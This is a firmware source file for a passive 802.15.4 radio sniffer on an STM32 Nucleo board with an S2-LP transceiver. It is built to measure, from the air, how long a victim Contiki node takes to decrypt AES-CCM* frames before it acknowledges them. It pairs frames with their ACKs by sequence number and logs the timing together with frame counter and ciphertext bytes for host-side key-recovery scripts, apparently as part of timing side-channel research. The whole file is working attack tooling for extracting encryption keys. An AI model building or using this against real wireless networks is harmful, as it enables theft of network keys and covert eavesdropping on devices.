/**
 * ATK_SNIFF -- third-party passive listener for the 802.15.4 ACK-turnaround
 * oracle.
 *
 * This is the board that closes the acquisition gap in PASSIVE_ORACLE.md.  Up
 * to now the victim timestamped its OWN receive->ACK interval, which is a
 * faithful stand-in for what a listener would measure but is not a listener
 * measurement, so the requirement that the attack run against a fully stock
 * victim image was unmet.  This firmware measures the same interval from the
 * air, on a node that neither party knows about and that transmits nothing.
 *
 * WHAT IT MEASURES
 *
 *   coordinator ---- secured data frame (AR set) ----> victim
 *                                                      | AES-CCM* decrypt
 *                                                      | + MIC verify
 *   coordinator <--------- 3-byte soft ACK ----------- victim
 *
 * csma.c sends that ACK straight from input_packet() via NETSTACK_RADIO.send,
 * i.e. AFTER csma_security_parse_frame() has run the whole decrypt, and WITHOUT
 * going through csma_output, so it carries none of the 1 ms-quantised CSMA
 * backoff.  The data-frame-to-ACK gap therefore contains the cipher and little
 * else.  Both edges are on air, so this node times them on ONE clock and there
 * is no inter-board drift term.
 *
 * OUTPUT FORMAT -- deliberately identical to the victim's own OTA_STAMP record:
 *
 *   S <r_data> <t_ack> <len> <hex of first SNIFF_HDR MPDU bytes> <drops> \
 *     <t_data> <r_ack> <acklen> <nopair>
 *
 * Fields 1 and 2 are the TIGHT bracket -- end of the data frame to sync-word
 * detect on the ACK -- because that is where every host tool reads the interval
 * from, and it is the quietest of the four combinations by measurement (robust
 * sd ~1.9 us, against ~2.0 us for sync-to-sync and ~2.1 us for the loose pair).
 * It is also the one the mechanism argues for: the victim starts its decrypt
 * when the data frame ends and stops when it keys up the ACK, so everything
 * else in that interval is a constant.  The two remaining edges go in the extra
 * fields, so the choice stays checkable from any capture rather than assumed.
 *
 * The first six fields are exactly what radio-driver.c's ota_drain() prints, so
 * every existing host tool (atk_ota_stream.py, atk_lastround.py,
 * recover_best.py, monitor_keyrec.py) reads a sniffer log unchanged and the two
 * measurements are directly comparable.  Fields 7-10 are additions this
 * firmware can supply and the victim could not:
 *
 *   r_data, r_ack  RX_DATA_READY stamps of the two frames.  (t_ack - t_data)
 *                  uses sync-word detect for both edges; (r_ack - r_data) uses
 *                  end-of-frame for both.  Which of the two is the quieter
 *                  observable is an empirical question -- sync detect is a
 *                  correlator threshold crossing and end-of-frame is a CRC
 *                  completion, and they have no reason to have the same
 *                  jitter.  Logging both costs 22 characters and settles it
 *                  from the capture instead of from an argument.
 *   acklen         the ACK's MPDU length, so a mis-classified frame is visible
 *                  in the log rather than silently paired.
 *   nopair         data frames that never got an ACK matched to them.  A rising
 *                  nopair with a flat drops means the listener is missing ACKs,
 *                  which is a receiver problem; a rising drops means the UART
 *                  is not keeping up, which is a throughput problem.  They fail
 *                  differently and the log has to tell them apart.
 *
 * PAIRING IS EXACT, NOT HEURISTIC
 *
 * csma.c builds the ACK as { FRAME802154_ACKFRAME, 0, hdrptr[2] } -- byte 2 is
 * the acknowledged frame's 802.15.4 sequence number.  So an ACK carries the
 * seqno of the data frame it answers, and this firmware pairs on that rather
 * than on "the next 3-byte frame".  A dropped frame, a retransmission or the
 * victim's own traffic can therefore not produce a wrong pair; it produces no
 * pair, which is counted.
 *
 * Derived from ATK_RXSTAMP, which is in turn derived from CUSTOM_FIFO_RX.
 */
#include <stdio.h>
#include <string.h>
#include "main.h"
#include "s2lp.h"
#include "S2LP_Gpio.h"
#include "custom_s2lp.h"
/* The same source builds on the F401RE (Cortex-M4, 84 MHz) and the L152RE
 * (Cortex-M3, 32 MHz); which part makes the better listener is being decided
 * by measurement, so the two copies of this file are kept byte-identical and
 * only the BSP header differs. */
#if defined(__has_include)
#  if __has_include("stm32l1xx_nucleo.h")
#    include "stm32l1xx_nucleo.h"
#  else
#    include "stm32f4xx_nucleo.h"
#  endif
#else
#  include "stm32f4xx_nucleo.h"
#endif
#include "custom_s2lp_conf.h"
#include "s2lp_radio_settings.h"
#include "custom_s2lpgpio_setting.h"

#include "S2LP_PktBasic.h"
#include "s2lp_sdkapi_mapping.h"

#include "custom_s2lp_management.h"

void MX_S2LP_FIFO_RX_Init(void);
void MX_S2LP_FIFO_RX_Process(void);
void S2LPInterfaceInit(void);
RangeExtType S2LP_ManagementGetRangeExtender(void);
void S2LP_ManagementRangeExtInit(void);
void S2LP_ManagementIdentificationRFBoard(void);
int32_t S2LP_ManagementGetOffset(void);

__WEAK void FifoRxCallback_GPIO_0(void);
__WEAK void FifoRxCallback_GPIO_1(void);
__WEAK void FifoRxCallback_GPIO_2(void);
__WEAK void FifoRxCallback_GPIO_3(void);

#define RX_BUF_LEN 128

/* ---- build-time configuration ------------------------------------------- */

/* How many MPDU bytes of the data frame to log.  The attack needs the
 * auxiliary security header (frame counter) and the ciphertext blocks whose
 * plaintext is predictable; for the 54-byte MPDU this network sends, the
 * payload starts at offset 26 and everything to the MIC is wanted.  64 covers
 * it with room to spare.  Every extra byte is two more characters per record
 * on a UART that is already the throughput limit, so do not raise it idly. */
#ifndef SNIFF_HDR
#define SNIFF_HDR 64
#endif

/* Console baud.  115200 is 87 us per character: one 170-character record is
 * 14.8 ms, which at any useful frame rate overflows the ring instantly.  The
 * victim hit exactly this and the fix was the same. */
#ifndef SNIFF_BAUD
#define SNIFF_BAUD 921600
#endif

#ifndef SNIFF_NREC
#define SNIFF_NREC 24
#endif

/* Contiki's CSMA_ACK_LEN. */
#ifndef SNIFF_ACK_LEN
#define SNIFF_ACK_LEN 3
#endif

/* A data frame shorter than this cannot carry a secured 802.15.4 header, so it
 * is not a candidate to pair. */
#ifndef SNIFF_MIN_DATA_LEN
#define SNIFF_MIN_DATA_LEN 16
#endif

/* Pairing window, in CPU cycles.  The measured turnaround is ~1.2 ms = ~103 k
 * cycles at 84 MHz.  A generous ceiling still rejects an ACK that belongs to a
 * frame this node missed and whose seqno happened to collide 256 frames later. */
#ifndef SNIFF_MAX_GAP
#define SNIFF_MAX_GAP 4000000u
#endif

/* Restrict pairing to data frames addressed to ONE node.  Without this the
 * listener would also pair the victim's own secured transmissions with the
 * COORDINATOR's ACKs, and the log would be a mixture of two different parts'
 * turnarounds -- a confound that the host's dominant-frame-length filter would
 * mostly, but not reliably, hide.
 *
 * The bytes are as they appear on air in the MPDU destination field, i.e.
 * little-endian EUI-64.  Default is the victim on this bench,
 * 0351.3531.6934.8f33.  Set SNIFF_DST_ANY=1 to pair every acknowledged frame. */
#ifndef SNIFF_DST_ANY
#define SNIFF_DST_ANY 0
#endif
#ifndef SNIFF_DST
/* Bare comma list, no braces: the shell brace-expands a braced -D value
 * into separate flags.  Braces are added at the use site. */
#define SNIFF_DST 0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00
#endif

/* MPDU layout of the frames this network sends, confirmed against a capture:
 *   0..1 FCF   2 seqno   3..4 PAN   5..12 dst EUI-64   13..20 src EUI-64
 *   21 security level   22..25 frame counter   26.. payload
 * Only the two fields this firmware actually reads are named. */
#define MPDU_SEQNO_OFF 2
#define MPDU_DST_OFF   5

/* The stock Contiki victim runs RADIO_ADDRESS_FILTERING=1, hence
 * `EN_ADDRESS S_ENABLE`, which inserts an address byte into the S2-LP basic
 * packet layout.  A receiver configured without it parses every field one byte
 * off and drops every frame on CRC.  Match the victim's on-air layout, but
 * disable all three address *filters* so this node stays promiscuous. */
#undef EN_ADDRESS
#define EN_ADDRESS S_ENABLE

/* The FIFO example this is derived from carries payloads up to 300 bytes and so
 * sets EXTENDED_LENGTH_FIELD, making the on-air length field two bytes.  The
 * victim uses a one-byte field. */
#undef EXTENDED_LENGTH_FIELD
#define EXTENDED_LENGTH_FIELD S_DISABLE

/* Latched by EXTI before any dispatch.  See stm32f4xx_it.c. */
extern volatile uint32_t atk_raw_stamp;
extern volatile uint32_t atk_raw_count;

typedef struct {
  uint32_t t_data, t_ack, r_data, r_ack;
  uint16_t len;
  uint8_t  acklen;
  uint8_t  hdr[SNIFF_HDR];
} sniff_rec_t;

static uint8_t  rx_buf[RX_BUF_LEN];
static volatile uint32_t stamp_sync;      /* committed on VALID_SYNC    */
static volatile uint32_t stamp_ready;     /* committed on RX_DATA_READY */

static volatile sniff_rec_t rec[SNIFF_NREC];
static volatile uint8_t  rec_wr, rec_rd;
static volatile uint32_t n_drop;          /* ring full: record thrown away */
static volatile uint32_t n_nopair;        /* data frame never matched      */
static volatile uint32_t n_sync, n_ready, n_disc, n_ack, n_data;

/* The data frame waiting for its ACK. */
static volatile uint32_t pend_sync, pend_ready;
static volatile uint16_t pend_len;
static volatile uint8_t  pend_seq, pend_valid;
static volatile uint8_t  pend_hdr[SNIFF_HDR];

#if !SNIFF_DST_ANY
static const uint8_t sniff_dst[8] = { SNIFF_DST };
#endif

S2LPIrqs xIrqStatus;

SRadioInit xRadioInit = {
  BASE_FREQUENCY,
  MODULATION_SELECT,
  DATARATE,
  FREQ_DEVIATION,
  BANDWIDTH
};

PktBasicInit xBasicInit = {
  PREAMBLE_LENGTH,
  SYNC_LENGTH,
  SYNC_WORD,
  VARIABLE_LENGTH,
  EXTENDED_LENGTH_FIELD,
  CRC_MODE,
  EN_ADDRESS,
  EN_FEC,
  EN_WHITENING
};

SGpioInit xGpioIRQ = {
  S2LP_GPIO_3,
  RADIO_GPIO_MODE_DIGITAL_OUTPUT_LP,
  RADIO_GPIO_DIG_OUT_IRQ
};

/* Callback table the BSP registers with CUSTOM_S2LP_RADIO_IoIrqEnable(). */
static GpioIrqHandler *GpioIrq[] = {
#if (USE_CUSTOM_S2LP_RADIO_GPIO_0 == 1)
    FifoRxCallback_GPIO_0,
#endif
#if (USE_CUSTOM_S2LP_RADIO_GPIO_1 == 1)
    FifoRxCallback_GPIO_1,
#endif
#if (USE_CUSTOM_S2LP_RADIO_GPIO_2 == 1)
    FifoRxCallback_GPIO_2,
#endif
#if (USE_CUSTOM_S2LP_RADIO_GPIO_3 == 1)
    FifoRxCallback_GPIO_3,
#endif
};


/* Re-arm the cycle counter on every pass.
 *
 * DWT->CYCCNT only runs while CoreDebug->DEMCR.TRCENA is set, and TRCENA is a
 * DEBUG register: a debug probe owns it too.  pyocd CLEARS IT ON DISCONNECT, so
 * any `boards.flash()` or `boards.reset()` stops the cycle counter of firmware
 * that armed it once at boot -- about 100 ms after the target is released from
 * reset, i.e. after atk_dwt_init() has already run and reported `dwt=live`.
 *
 * The failure is silent and it does not look like a failure.  The counter does
 * not reset and it does not read zero; it FREEZES, so every record afterwards
 * carries the same plausible-looking stamp, every interval computes as 0, and a
 * capture of millions of such records is uniformly, invisibly worthless.  This
 * was mistaken for a post-reset transient once already, on the grounds that the
 * first records after a flash looked degenerate and later ones did not -- the
 * later ones only recovered because an unrelated pyocd *attach* had switched
 * TRCENA back on.
 *
 * SWD was unavailable on this host for the earlier campaigns, which is why this
 * never bit before and why the existing captures are unaffected.  Two
 * instructions per loop make it impossible rather than remembered. */
#define ATK_DWT_REARM() do {                                       CoreDebug->DEMCR |= CoreDebug_DEMCR_TRCENA_Msk;                DWT->CTRL        |= DWT_CTRL_CYCCNTENA_Msk;                  } while (0)


/* ---- activity LED --------------------------------------------------------
 *
 * The rig runs unattended off USB wall warts with no console attached, so the
 * only way to see that the network is alive is a light.  LD2 on PA5 is free:
 * the X-NUCLEO-S2915A1 claims PA1 (NSS), PA4 (GPIO1), PA6/PA7 (MISO/MOSI),
 * PA8 (SDN), PB3 (SCK), PC0 (GPIO3) and PC7 (TCXO), and SPI1_SCK is PB3 rather
 * than the PA5 an Arduino-header habit would expect -- so driving PA5 cannot
 * disturb the radio.  Same pin on the F401RE and the L152RE.
 *
 * Toggled once per PAIRED record, i.e. once per data frame that was matched to
 * its ACK.  That is deliberately not "per frame received": it blinks only when
 * the sniffer is actually producing the measurement, so a dark LED on a live
 * network means the pairing is broken rather than the radio. */
#ifndef SNIFF_LED
#define SNIFF_LED 1
#endif

#if SNIFF_LED
#define SNIFF_LED_PORT  GPIOA
#define SNIFF_LED_PIN   GPIO_PIN_5

static void sniff_led_init(void)
{
    GPIO_InitTypeDef g = {0};
    __HAL_RCC_GPIOA_CLK_ENABLE();
    g.Pin   = SNIFF_LED_PIN;
    g.Mode  = GPIO_MODE_OUTPUT_PP;
    g.Pull  = GPIO_NOPULL;
    g.Speed = GPIO_SPEED_FREQ_LOW;
    HAL_GPIO_Init(SNIFF_LED_PORT, &g);
    HAL_GPIO_WritePin(SNIFF_LED_PORT, SNIFF_LED_PIN, GPIO_PIN_RESET);
}
#define SNIFF_LED_TOGGLE() HAL_GPIO_TogglePin(SNIFF_LED_PORT, SNIFF_LED_PIN)
#else
static void sniff_led_init(void) { }
#define SNIFF_LED_TOGGLE() do { } while (0)
#endif

static int dwt_live;

static void atk_dwt_init(void)
{
    CoreDebug->DEMCR |= CoreDebug_DEMCR_TRCENA_Msk;
    DWT->CYCCNT = 0;
    DWT->CTRL |= DWT_CTRL_CYCCNTENA_Msk;
    uint32_t a = DWT->CYCCNT;
    for (volatile int q = 0; q < 50; q++) {}
    dwt_live = (DWT->CYCCNT != a);
}

void MX_X_CUBE_SUBG2_Init(void)
{
    MX_S2LP_FIFO_RX_Init();
}

void MX_S2LP_FIFO_RX_Init(void)
{
    BSP_COM_Init(COM1);
    sniff_led_init();
    atk_dwt_init();

    S2LPInterfaceInit();
    S2LP_GPIO_Init(&xGpioIRQ);
    S2LP_RADIO_Init(&xRadioInit);
    S2LP_PCKT_BASIC_Init(&xBasicInit);

    /* Address field present (to match the victim's layout) but every filter
     * off, so nothing is rejected on address. */
    {
        PktBasicAddressesInit xAddressInit = {
            S_DISABLE, 0x00,   /* filter on my address    */
            S_DISABLE, 0xEE,   /* filter on multicast     */
            S_DISABLE, 0xFF    /* filter on broadcast     */
        };
        S2LP_PCKT_BASIC_AddressesInit(&xAddressInit);
    }

    S2LP_GPIO_IrqDeInit(NULL);
    S2LP_GPIO_IrqConfig(VALID_SYNC,     S_ENABLE);
    S2LP_GPIO_IrqConfig(RX_DATA_READY,  S_ENABLE);
    S2LP_GPIO_IrqConfig(RX_DATA_DISC,   S_ENABLE);
    S2LP_GPIO_IrqClearStatus();

    S2LP_CMD_StrobeFlushRxFifo();
    S2LP_CMD_StrobeRx();

    printf("\r\nATK_SNIFF ready  dwt=%s  rate=%ld  hdr=%d  dst=",
           dwt_live ? "live" : "DEAD", (long)DATARATE, (int)SNIFF_HDR);
#if SNIFF_DST_ANY
    printf("any");
#else
    for (int i = 0; i < 8; i++) { printf("%02X", sniff_dst[i]); }
#endif
    printf("\r\n# S r_data t_ack len hex drops t_data r_ack acklen nopair\r\n");
}

void MX_S2LP_FIFO_RX_Process(void)
{
    if (rec_rd == rec_wr) {
        return;
    }
    volatile sniff_rec_t *r = &rec[rec_rd];
    unsigned i;

    printf("S %lu %lu %u ", (unsigned long)r->r_data,
           (unsigned long)r->t_ack, (unsigned)r->len);
    for (i = 0; i < SNIFF_HDR; i++) {
        printf("%02X", r->hdr[i]);
    }
    printf(" %lu %lu %lu %u %lu\r\n", (unsigned long)n_drop,
           (unsigned long)r->t_data, (unsigned long)r->r_ack,
           (unsigned)r->acklen, (unsigned long)n_nopair);

    rec_rd = (uint8_t)((rec_rd + 1) % SNIFF_NREC);
    SNIFF_LED_TOGGLE();

    /* Re-arm here, once per drained record, rather than on every pass of the
     * idle loop.  Both work; this one touches the debug bus at frame rate
     * instead of at spin rate, and still recovers within one record of a probe
     * disconnect.
     *
     * It was moved here on the theory that hammering DEMCR and DWT->CTRL from
     * the spin loop was inflating the jitter this firmware exists to measure.
     * THAT THEORY IS FALSE and the record is kept because the way it failed is
     * the useful part.  The evidence for it was two consecutive runs agreeing
     * to 1.4 % (1381 and 1401 ns) against an earlier 1159 ns.  Moving the
     * re-arm here should then have restored ~1159; it measured 1733 ns, worse
     * than either.  The real variation is run-to-run -- sigma_add on this bench
     * wanders over roughly 1.2-1.8 us in the same configuration with the same
     * firmware -- and two neighbouring runs agreeing tightly says nothing about
     * a change made between them.  Sizing a campaign off a single 110 s
     * calibration would inherit that whole spread. */
    ATK_DWT_REARM();
}

void MX_X_CUBE_SUBG2_Process(void)
{
    MX_S2LP_FIFO_RX_Process();
}

/* Is this MPDU a secured data frame addressed to the node we are watching and
 * asking to be acknowledged?  Everything this returns 0 for is ignored rather
 * than guessed at. */
static int is_target_data(const uint8_t *b, uint8_t n)
{
    if (n < SNIFF_MIN_DATA_LEN) {
        return 0;
    }
    /* FCF: bit 3 security enabled, bit 5 ack request.  An unsecured frame has
     * no AES in its receive path and a frame with AR clear is never ACKed, so
     * neither can contribute a turnaround. */
    if (!((b[0] >> 3) & 1) || !((b[0] >> 5) & 1)) {
        return 0;
    }
#if !SNIFF_DST_ANY
    for (int i = 0; i < 8; i++) {
        if (b[MPDU_DST_OFF + i] != sniff_dst[i]) {
            return 0;
        }
    }
#endif
    return 1;
}

void FifoRxCallback_GPIO_3(void)
{
    /* atk_raw_stamp was latched at EXTI entry, before this dispatch. */
    uint32_t raw = atk_raw_stamp;

    S2LP_GPIO_IrqGetStatus(&xIrqStatus);

    if (xIrqStatus.IRQ_VALID_SYNC) {
        stamp_sync = raw;
        n_sync++;
    }

    if (xIrqStatus.IRQ_RX_DATA_READY) {
        uint8_t len = S2LP_FIFO_ReadNumberBytesRxFifo();
        unsigned i;

        stamp_ready = raw;
        if (len > RX_BUF_LEN) { len = RX_BUF_LEN; }
        S2LP_ReadFIFO(len, rx_buf);
        n_ready++;

        /* Re-arm immediately.  The ACK follows ~1.2 ms behind the data frame
         * and is only ~0.5 ms long, so anything that delays the re-strobe
         * costs the pair, not just latency. */
        S2LP_CMD_StrobeFlushRxFifo();
        S2LP_CMD_StrobeRx();

        if (len == SNIFF_ACK_LEN && pend_valid) {
            n_ack++;
            if (rx_buf[MPDU_SEQNO_OFF] == pend_seq &&
                (uint32_t)(stamp_sync - pend_sync) < SNIFF_MAX_GAP) {
                uint8_t w = rec_wr, nxt = (uint8_t)((w + 1) % SNIFF_NREC);
                if (nxt == rec_rd) {
                    n_drop++;
                } else {
                    rec[w].t_data = pend_sync;
                    rec[w].t_ack  = stamp_sync;
                    rec[w].r_data = pend_ready;
                    rec[w].r_ack  = raw;
                    rec[w].len    = pend_len;
                    rec[w].acklen = len;
                    for (i = 0; i < SNIFF_HDR; i++) {
                        rec[w].hdr[i] = pend_hdr[i];
                    }
                    rec_wr = nxt;
                }
                pend_valid = 0;
            }
            /* An ACK whose seqno does not match is somebody else's; leave the
             * pending frame alone, its own ACK may still be coming. */
        } else if (is_target_data(rx_buf, len)) {
            unsigned n = (len < SNIFF_HDR) ? len : SNIFF_HDR;
            if (pend_valid) {
                n_nopair++;          /* previous one never got its ACK */
            }
            n_data++;
            pend_sync  = stamp_sync;
            pend_ready = raw;
            pend_len   = len;
            pend_seq   = rx_buf[MPDU_SEQNO_OFF];
            for (i = 0; i < n; i++) { pend_hdr[i] = rx_buf[i]; }
            for (; i < SNIFF_HDR; i++) { pend_hdr[i] = 0; }
            pend_valid = 1;
        }
    }

    if (xIrqStatus.IRQ_RX_DATA_DISC) {
        n_disc++;
        S2LP_CMD_StrobeFlushRxFifo();
        S2LP_CMD_StrobeRx();
    }
}

__WEAK void FifoRxCallback_GPIO_0(void) { }
__WEAK void FifoRxCallback_GPIO_1(void) { }
__WEAK void FifoRxCallback_GPIO_2(void) { }

/* Verbatim from the stock CUSTOM_FIFO_* examples: SDN/SPI bring-up, board
 * identification, crystal-offset compensation and uC IRQ enable.  Kept
 * unchanged so the radio front end is the vendor path and only the
 * application logic above is ours. */
void S2LPInterfaceInit(void)
{
  CUSTOM_S2LP_RADIO_Init();

  if (S2LP_Init() != S2LP_OK) {
    while (1) { }
  }

  CUSTOM_S2LP_RADIO_EnterShutdown();
  CUSTOM_S2LP_RADIO_ExitShutdown();

  S2LP_ManagementIdentificationRFBoard();

  xRadioInit.lFrequencyBase = (uint32_t) BASE_FREQUENCY + S2LP_ManagementGetOffset();

  S2LP_ManagementRangeExtInit();

  CUSTOM_S2LP_RADIO_IoIrqEnable(GpioIrq);
}
